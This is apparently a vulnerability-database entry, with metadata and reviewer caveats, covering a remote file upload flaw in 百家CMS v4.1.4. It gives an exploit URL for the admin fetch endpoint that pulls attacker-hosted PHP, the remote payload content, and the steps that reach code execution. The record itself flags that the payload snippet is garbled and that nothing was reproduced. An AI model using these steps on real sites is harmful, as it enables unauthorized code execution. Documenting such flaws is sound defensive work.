---
source: "hatch 补库批 20260928"
product: "百家CMS4.1.4"
record_type: "unknown"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "百家cms v4.1.4 远程文件上传漏洞"
prerequisites: "来源所述条件，未列明部分仍待核：backendfetchpermission;outboundHTTP;remoteendpointreturnssourcePHP;localPHPexecution"
side_effects: "未执行；原文未提供完整的状态变化与恢复证据，实际操作影响按本文入口、进程权限和实验条件核对"
source_status: "unknown"
id: "vw-9d8764348ee0f99ef5837353"
entity_id: "ve-9d8764348ee0f99ef5837353"
schema_version: "1"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：backendfetchpermission;outboundHTTP;remoteendpointreturnssourcePHP;localPHPexecution

- **证据待核（1）**：远程test.php内容PHP片段有Markdown星号/转义、缺闭合说明，应明确服务器响应必须是PHP源码而不是已执行结果。保留原引用、截图位置和实验叙述；本项所缺材料未被补造，截图存在或作者宣称成功都不等于已核验其内容。

- **适用与权限边界（2）**：有fetchURL和返回路径截图但无真实落点文本，不能无条件推脚本解析。按此限制解释本文结论，版本相同不足以证明所需角色、入口、配置、依赖或可控参数均已满足；原操作和失败记录一并保留。

- **证据待核（3）**：714/715借本篇全部图片，可能应以本篇归属为准需视觉核。保留原引用、截图位置和实验叙述；本项所缺材料未被补造，截图存在或作者宣称成功都不等于已核验其内容。

- **适用与权限边界（4）**：缺安全修复与源码，后台身份前提明确。按此限制解释本文结论，版本相同不足以证明所需角色、入口、配置、依赖或可控参数均已满足；原操作和失败记录一并保留。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# 百家cms v4.1.4 远程文件上传漏洞

一、漏洞简介
------------

二、漏洞影响
------------

百家cms v4.1.4

三、复现过程
------------

    # 需要后台权限
    http://www.0-sec.org/index.php?mod=web&do=file&m=public&op=fetch&url=http://xx.xx.xx.xx/test/test.php

远程服务器起一个/test/test.php，内容为\*\*\<?php echo \"\<?php
phpinfo();\";\*\*

![](./.resource/百家cmsv4.1.4远程文件上传漏洞/media/rId24.png)

访问payload，得到路径

![](./.resource/百家cmsv4.1.4远程文件上传漏洞/media/rId25.png)

访问路径，执行代码

![](./.resource/百家cmsv4.1.4远程文件上传漏洞/media/rId26.png)

查看本地文件

![](./.resource/百家cmsv4.1.4远程文件上传漏洞/media/rId27.png)

参考链接
--------

> https://xz.aliyun.com/t/7542
